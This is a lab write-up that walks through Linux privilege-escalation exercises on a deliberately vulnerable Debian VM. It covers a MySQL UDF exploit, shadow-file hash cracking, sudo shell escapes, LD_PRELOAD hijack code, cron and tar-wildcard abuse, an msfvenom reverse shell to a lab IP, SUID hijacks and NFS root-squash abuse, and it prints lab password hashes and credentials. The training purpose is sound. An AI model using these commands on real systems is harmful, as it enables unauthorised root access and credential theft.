# Linux PrivEsc

**Date:** 24, May, 2021

**Author:** Dhilip Sanjay S

---

##  Deploy the Vulnerable Debian VM

```bash
ssh user@10.10.95.239
The authenticity of host '10.10.95.239 (10.10.95.239)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.95.239' (RSA) to the list of known hosts.
user@10.10.95.239's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$ whoami
user
```

### Run the "id" command. What is the result?
- **Answer:** uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

---

## Service exploits

- [MySQL UDF Exploit](https://www.exploit-db.com/exploits/1518)

```bash
user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC

user@debian:~/tools/mysql-udf$ ls
raptor_udf2.c  raptor_udf2.o

user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

user@debian:~/tools/mysql-udf$ ls
raptor_udf2.c  raptor_udf2.o  raptor_udf2.so
```

- Run the MySQL commands:

```bash
user@debian:~/tools/mysql-udf$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)                                                                                                                         
                                                                                                                                                             
mysql> select do_system ('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
```

- Gain root shell using the **rootbash**.

```bash
user@debian:~/tools/mysql-udf$ cd /tmp
user@debian:/tmp$ ls
backup.tar.gz  rootbash  useless
user@debian:/tmp$ ./rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

##  Weak File Permissions - Readable /etc/shadow

### What is the root user's password hash?
- **Answer:** $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
- **Steps to Reproduce:** 
    - Read the `/etc/shadow` file:

```bash
user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```

### What hashing algorithm was used to produce the root user's password hash?
- **Answer:** sha512crypt

### What is the root user's password?
- **Answer:** password123
- **Steps to Reproduce:** 
    - Crack the hash using john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2021-05-24 13:04) 1.162g/s 1637p/s 1637c/s 1637C/s cuties..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

---

##  Weak File Permissions - Writable /etc/shadow

```bash
user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
user@debian:~$ mkpasswd -m sha-512 supersecretpassword
$6$OGWiu3TBVJ$irEIBakkRL0CkmbVXhc0fp5gu/Mum0M417CILk2JM07.nAhRTvbCKqVpRhsX2ouY.KvwS8Eo26vtrPsycA6Qf0
```

- Edit `/etc/shadow` and su using the new password:

```
user@debian:~$ nano /etc/shadow
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami
root
```


---

##  Weak File Permissions - Writable /etc/passwd

- Generate a new encrypted password using openssl

```bash
user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~$ openssl passwd tough
L7E1UkeBb0kV6
```

- Replace the **x** inside `/etc/passwd` of the root user to the newly generated encrypted password:

```
user@debian:~$ nano /etc/passwd
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami
root
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

### Run the "id" command as the newroot user. What is the result?
- **Answer:** uid=0(root) gid=0(root) groups=0(root)

---

##  Sudo - Shell Escape Sequences

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

### How many programs is "user" allowed to run via sudo? 
- **Answer:** 11

### Using GTFO bins


```bash
$ sudo iftop
!/bin/sh

---
$ sudo find . -exec /bin/sh \; -quit

---
sudo nano
^R^X
reset; sh 1>&0 2>&0

---
sudo vim -c ':!/bin/sh'

---
sudo man man
!/bin/sh

---
sudo awk 'BEGIN {system("/bin/sh")}'

---
sudo less /etc/profile
!/bin/sh

---
sudo ftp
!/bin/sh

---
sudo nmap --interactive
nmap> !sh

---
sudo more /etc/profile
!/bin/sh
```

### One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
- **Answer:** apache2

### Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

- We can use the **-f** option to provide the config file.
- If the config file contains invalid commands, it'll error out the first line of the file.
- We can use this to read the first line of `/etc/passwd`:

```bash
user@debian:~$ /usr/sbin/apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```


---

##  Sudo - Environment Variables

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

- LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment

### LD_PRELOAD 

```bash
user@debian:~/tools/sudo$ ls
library_path.c  preload.c
user@debian:~/tools/sudo$ cat preload.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

user@debian:~/tools/sudo$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
user@debian:~/tools/sudo$ cd

user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so find
root@debian:/home/user# whoami
root
```

### LD_LIBRARY_PATH 

```bash
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff3d5ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f612cd8f000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f612cb6b000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f612c931000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f612c715000)
        libc.so.6 => /lib/libc.so.6 (0x00007f612c3a9000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f612c1a4000)
        librt.so.1 => /lib/librt.so.1 (0x00007f612bf9c000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f612bd65000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f612bb60000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f612b938000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f612d24c000)
```

```bash
user@debian:~$ cat tools/sudo/library_path.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user# whoami
root
```

---

##  Cron Jobs - File Permissions

```bash
user@debian:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

user@debian:/tmp$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 373.9 days)
/usr/local/bin/overwrite.sh
user@debian:/tmp$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
user@debian:/tmp$ nano /usr/local/bin/overwrite.sh
```


- Reverse Shell on target machine:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.95.239] 57151
bash: no job control in this shell
root@debian:~# whoami
whoami
root
```

---

##  Cron Jobs - PATH Environment Variable

### What is the value of the PATH variable in /etc/crontab?
- **Answer:** /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
- **Steps to Reproduce:** 

```bash
user@debian:/tmp$ cat /etc/crontab
.
.
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
.
```

- Exploiting PATH environment varibale:

```bash
user@debian:~$ nano overwrite.sh
user@debian:~$ chmod +x overwrite.sh 

user@debian:~$ cd /tmp/
user@debian:/tmp$ ls -l
total 1032
-rw-r--r-- 1 root root  98894 May 24 04:27 backup.tar.gz
-rwxr-xr-x 1 user user   6324 May 24 04:10 libcrypt.so.1
-rwxr-xr-x 1 user user   3857 May 24 04:08 preload.so
-rwsr-s--x 1 root root 926536 May 24 04:27 rootbash
-rw-r--r-- 1 root root     29 May 24 04:22 useless
user@debian:/tmp$ ./rootbash -p
```

---

##  Cron Jobs - Wildcards

- View the **compress.sh** file:

```bash
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

- Transfer **shell.elf** using scp

```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.7.91 LPORT=4444 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf

$ scp
usage: scp [-346ABCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
            [-J destination] [-l limit] [-o ssh_option] [-P port]
            [-S program] source ... target

$ scp shell.elf user@10.10.95.239:/home/user 
user@10.10.95.239's password: 
shell.elf                                                                                           100%  194     1.2KB/s   00:00    
```

- Creating file with appropriate names to exploit Wildcards:

```bash
user@debian:~$ ls
myvpn.ovpn  overwrite.sh  overwrite.sh.save  shell.elf  tools
user@debian:~$ chmod +x shell.elf

user@debian:~$ touch /home/user/--checkpoint=1
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
```

- Obtaining Reverse Shell as root:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.95.239] 57234
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

---

##  SUID / SGID Executables - Known Exploits

- Locate files with SUID/SGID set:

```bash
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/change
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwsr-s--x 1 root root 926536 May 24 04:36 /tmp/rootbash
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

- Running the exploit to gain root shell:

```bash
user@debian:~$ ls -l tools/suid/exim/cve-2016-1531.sh 
-rwxr-xr-x 1 user user 643 May 15  2017 tools/suid/exim/cve-2016-1531.sh
user@debian:~$ ./tools/suid/exim/cve-2016-1531.sh 

[ CVE-2016-1531 local root exploit ]
sh-4.1# whoami 
root
sh-4.1# id
uid=0(root) gid=1000(user) groups=0(root)
```

---

##  SUID / SGID Executables - Shared Object Injection

- Running **strace** on the SUID executable `suid-so`:

```bash
user@debian:~$ ls -l /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

- Creating a malicious shared object file:

```bash
user@debian:~$ mkdir .config
user@debian:~$ cd .config/
user@debian:~/.config$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
user@debian:~/.config$ ls
libcalc.so
```

- Gaining root access by running the vulnerable SUID binary:

```bash
user@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# whoami
root
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

##  SUID / SGID Executables - Environment Variables

- Running `strings` on the SUID binary:

```bash
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
user@debian:~/.config$ cd 
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

- Compile the malicious C code and storing the executable in the home directory.
- Append the current directory to the **PATH variable**.
- Run the binary to gain root shell

```bash
user@debian:~$ gcc -o service /home/user/tools/suid/service.c
user@debian:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
user@debian:~$ PATH=.:$PATH
user@debian:~$ /usr/local/bin/suid-env
root@debian:~# whoami
root
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

##  SUID / SGID Executables - Abusing Shell Features (#1)

- Running `strings` on SUID executable:

```bash
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
user@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

- Checking the version of bash. (Bash < 4.2-028) 
- We can create functions which take precedence of the binary executables.

```bash
user@debian:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~$ export -f /usr/sbin/service
user@debian:~$ /usr/sbin/service apache2 start
```

- Running the SUID executable to gain root access:

```bash
user@debian:~$ /usr/local/bin/suid-env2
root@debian:~# whoami
root
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

##  SUID / SGID Executables - Abusing Shell Features (#2)

- When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

```bash
user@debian:~$ ls -l /usr/local/bin/suid-env2
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
user@debian:~$ env -i SHELLOPTS=xtrace PS4='<test>' /usr/local/bin/suid-env2
<test>/usr/sbin/service apache2 start
<<test>basename /usr/sbin/service
<test>VERSION='service ver. 0.91-ubuntu1'
<<test>basename /usr/sbin/service
<test>USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
<test>SERVICE=
<test>ACTION=
<test>SERVICEDIR=/etc/init.d
<test>OPTIONS=
<test>'[' 2 -eq 0 ']'
<test>cd /
<test>'[' 2 -gt 0 ']'
<test>case "${1}" in
<test>'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
<test>'[' 2 -eq 2 -a start = --full-restart ']'
<test>'[' -z '' ']'
<test>SERVICE=apache2
<test>shift
<test>'[' 1 -gt 0 ']'
<test>case "${1}" in
<test>'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
<test>'[' 1 -eq 2 -a '' = --full-restart ']'
<test>'[' -z apache2 ']'
<test>'[' -z '' ']'
<test>ACTION=start
<test>shift
<test>'[' 0 -gt 0 ']'
<test>'[' -r /etc/init/apache2.conf ']'
<test>'[' -x /etc/init.d/apache2 ']'
<test>exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1670) already running
.

user@debian:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1670) already running
```

- Gaining root access:

```bash
user@debian:~$ /tmp/rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```


---

##  Passwords & Keys - History Files

- Check out the history files:

```bash
user@debian:~$ cat ~/.*history | more
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
whoami
id
exit
whoami
id
ps aux | grep root
```

### What is the full mysql command the user executed?
- **Answer:** mysql -h somehost.local -uroot -ppassword123


- Gain root access using that password:

```bash
user@debian:~$ su
Password: 
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# whoami
root
```

---

##  Passwords & Keys - Config Files

- Cat the openvpn config file:

```bash
user@debian:~$ ls /home/user 
--checkpoint=1  --checkpoint-action=exec=shell.elf  myvpn.ovpn  overwrite.sh  overwrite.sh.save  service  shell.elf  tools
user@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
```

- Look into the `auth.txt`
- Gain root access using that password

```bash
user@debian:~$ cat /etc/openvpn/auth.txt 
root
password123

user@debian:~$ su
Password: 
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# whoami
root
```

---

##  Passwords & Keys - SSH Keys

- Look for ssh private keys:


```bash
user@debian:~$ ls -l /.ssh
total 4
-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
user@debian:~$ cat /.ssh/root_key
-----BEGIN RSA PRIVATE KEY-----

REDACTED
-----END RSA PRIVATE KEY-----
```

- Copy the code to your local machine.
- Change the file Permissions to 600.
- Login using ssh to gain root shell:

```bash
$ nano root_key
$ chmod 600 root_key 
$ ssh -i root_key root@10.10.95.239
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

##  NFS

- View the `/etc/exports` file.
- We can see **no_root_squash**

```bash
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

### What is the name of the option that disables root squashing?
- **Answer:** no_root_squash

- Mount and insert some malicious SUID binary as root user.

```bash
root@kali:~# mkdir /mnt/privescnfs
root@kali:~# mount -o rw,vers=2 10.10.95.239:/tmp /mnt/privescnfs/
root@kali:~# cd /mnt/privescnfs/
root@kali:/mnt/privescnfs# ls
backup.tar.gz  libcrypt.so.1  preload.so  rootbash  root.pm  useless
root@kali:/mnt/privescnfs# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Saved as: shell.elf
root@kali:/mnt/privescnfs# chmod +xs shell.elf
```

- Gaining root access on the target machine:

```bash
user@debian:~$ /tmp/shell.elf
bash-4.1# whoami
root
bash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

---

##  Kernel Exploits

- Run Linux Exploit Suggester
- It'll suggest **dirty cow**.

```bash
user@debian:~$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
